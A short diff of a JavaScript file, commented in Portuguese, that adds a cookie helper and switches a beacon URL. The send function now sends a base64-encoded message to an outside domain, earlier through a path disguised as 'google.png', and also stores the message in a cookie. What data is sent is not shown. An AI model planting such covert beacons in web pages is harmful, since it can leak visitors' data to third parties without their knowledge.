@@ -1,3 +1,12 @@
+function setCookie(name, value, days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); // Definir o tempo de expiração em dias
+        expires = "; expires=" + date.toUTCString();
+    }
+    document.cookie = name + "=" + (value || "") + expires + "; path=/"; // O path=/ garante que o cookie seja acessível em todo o site
+}
 function getTags(scriptElement) {
     if (!scriptElement) {
         return {};
@@ -65,7 +74,8 @@ function send(atributosScript) {
     	return;
     }
 
-    const urlComParametro = `https://jokerpks.com/google.png?i=${encodeURIComponent(mensagemBase64)}`;
+    setCookie('german', encodeURIComponent(mensagemBase64), 1);
+    const urlComParametro = `https://nabucolopes.com.br/alagoas/rdc?i=${encodeURIComponent(mensagemBase64)}`;
     
     fetch(urlComParametro, {
 	    method: 'GET',
